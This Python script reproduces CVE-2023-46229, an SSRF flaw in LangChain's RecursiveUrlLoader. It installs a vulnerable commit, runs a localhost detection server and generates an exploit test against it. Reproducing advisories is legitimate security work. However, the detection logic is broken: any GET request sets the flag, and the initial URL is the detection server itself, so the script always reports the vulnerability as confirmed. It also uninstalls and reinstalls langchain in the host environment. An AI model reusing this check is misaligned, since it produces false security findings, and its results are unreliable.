#!/usr/bin/env python3
"""
Test to reproduce CVE-2023-46229: SSRF in RecursiveUrlLoader.
GitHub Advisory: GHSA-655w-fm8m-m478
"""

import sys
import os
import tempfile
import subprocess
import git
import shutil
import time
import socket
import threading
import http.server
from typing import Optional, Tuple

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def setup_vulnerable_langchain() -> Optional[str]:
    """Check out the vulnerable version of LangChain.
    
    Returns:
        Path to the cloned repository if successful, None otherwise
    """
    print("Setting up vulnerable LangChain for CVE-2023-46229...")
    
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()
    
    try:
        # Clone the LangChain repository
        print(f"Cloning LangChain repository to {temp_dir}...")
        repo = git.Repo.clone_from("https://github.com/langchain-ai/langchain.git", temp_dir)
        
        # Checkout the vulnerable version - using a commit before the fix
        print("Checking out vulnerable version...")
        commit_hash = "ba0d72996177b4f0042a114a86d65b740c43b653"  # Commit right before fix
        repo.git.checkout(commit_hash)
        
        # Install the package in development mode
        print("Installing vulnerable LangChain version...")
        subprocess.run([sys.executable, "-m", "pip", "install", "-e", temp_dir], 
                      capture_output=True, check=True)
        
        # Install BeautifulSoup which is required by RecursiveUrlLoader
        subprocess.run([sys.executable, "-m", "pip", "install", "beautifulsoup4", "lxml"], 
                      capture_output=True, check=True)
        
        print("Vulnerable LangChain setup complete.")
        return temp_dir
    except Exception as e:
        print(f"Failed to set up vulnerable LangChain: {str(e)}")
        shutil.rmtree(temp_dir)
        return None


def cleanup_environment(repo_dir: str):
    """Clean up the environment after testing.
    
    Args:
        repo_dir: Path to the repository directory
    """
    print("Cleaning up environment...")
    
    # Uninstall the vulnerable version
    subprocess.run([sys.executable, "-m", "pip", "uninstall", "-y", "langchain"], 
                  capture_output=True)
    
    # Remove the temporary directory
    shutil.rmtree(repo_dir)
    
    # Reinstall the normal version
    subprocess.run([sys.executable, "-m", "pip", "install", "langchain"], 
                  capture_output=True)
    
    print("Cleanup complete.")


class SSRFDetectionHandler(http.server.BaseHTTPRequestHandler):
    """HTTP request handler that detects SSRF attempts."""
    
    ssrf_detected = False
    
    def do_GET(self):
        """Handle GET requests."""
        # Record that an SSRF attempt was detected
        SSRFDetectionHandler.ssrf_detected = True
        
        # Log the request
        print(f"[SSRF DETECTED] Received request for: {self.path}")
        print(f"Headers: {self.headers}")
        
        # Send a response with clear identifying information
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        response = f"""
        <html>
        <head><title>SSRF Test Server</title></head>
        <body>
        <h1>SSRF Vulnerability Detected!</h1>
        <p>This server was accessed via a potential SSRF vulnerability.</p>
        <p>Path: {self.path}</p>
        <a href="http://another-internal-server.local/secret">Secret Internal Link</a>
        </body>
        </html>
        """
        self.wfile.write(response.encode('utf-8'))
    
    def log_message(self, format, *args):
        """Override to prevent logging to stderr."""
        return


def start_ssrf_detection_server() -> Tuple[threading.Thread, int]:
    """Start a local HTTP server to detect SSRF attempts.
    
    Returns:
        Tuple of (server thread, port number)
    """
    # Find an available port
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('localhost', 0))
        port = s.getsockname()[1]
    
    # Reset the SSRF detection flag
    SSRFDetectionHandler.ssrf_detected = False
    
    # Create the server
    server = http.server.HTTPServer(('localhost', port), SSRFDetectionHandler)
    
    # Start the server in a separate thread
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    
    print(f"Started SSRF detection server on port {port}")
    return server_thread, port


def create_exploit_test(port: int) -> str:
    """Create a test file to trigger the vulnerability.
    
    Args:
        port: Port number of the SSRF detection server
        
    Returns:
        Path to the test file
    """
    fd, path = tempfile.mkstemp(suffix=".py")
    
    with os.fdopen(fd, "w") as f:
        f.write(f"""
import os
import sys
from langchain.document_loaders import RecursiveUrlLoader
from bs4 import BeautifulSoup

# URL with a link to our internal server
initial_url = "http://localhost:{port}/"

# Create the vulnerable RecursiveUrlLoader
# The default behavior should follow links to our SSRF detection server
loader = RecursiveUrlLoader(
    url=initial_url,
    max_depth=2,  # Follow links up to depth 2
    extractor=lambda x: BeautifulSoup(x, "lxml").text
)

# Load the documents, which should trigger the SSRF
try:
    print("Loading documents from URL...")
    docs = loader.load()
    print(f"Loaded {{len(docs)}} documents")
    
    # Print the first few documents
    for i, doc in enumerate(docs[:3]):
        print(f"Document {{i}}:")
        print(doc.page_content[:100] + "..." if len(doc.page_content) > 100 else doc.page_content)
        print(f"Metadata: {{doc.metadata}}")
        print()
        
    print("Test completed successfully.")
except Exception as e:
    print(f"Error during testing: {{str(e)}}")
""")
    
    return path


def test_cve_2023_46229():
    """Test for the RecursiveUrlLoader SSRF vulnerability.
    
    Returns:
        True if the vulnerability was confirmed, False otherwise
    """
    print(f"{'=' * 80}")
    print(f"Testing for CVE-2023-46229: RecursiveUrlLoader SSRF")
    print(f"{'=' * 80}")
    
    # Setup the vulnerable version of LangChain
    repo_dir = setup_vulnerable_langchain()
    if not repo_dir:
        print("Failed to set up the test environment.")
        return False
    
    try:
        # Start the SSRF detection server
        server_thread, port = start_ssrf_detection_server()
        
        # Create an exploit test file
        test_file = create_exploit_test(port)
        
        # Run the test
        print("\nRunning exploit test...")
        process = subprocess.run([sys.executable, test_file], 
                                capture_output=True, text=True)
        
        # Give the server a moment to process any requests
        time.sleep(2)
        
        # Check the output
        print("\nTest output:")
        print(process.stdout)
        print(process.stderr)
        
        # Check if SSRF was detected
        if SSRFDetectionHandler.ssrf_detected:
            print("\nVULNERABILITY CONFIRMED: RecursiveUrlLoader is vulnerable to SSRF")
            return True
        else:
            print("\nSSRF not detected. The version may be patched or the test may need adjustment.")
            return False
    
    except Exception as e:
        print(f"Error during testing: {str(e)}")
        return False
    
    finally:
        # Clean up
        cleanup_environment(repo_dir)


if __name__ == "__main__":
    result = test_cve_2023_46229()
    sys.exit(0 if result else 1)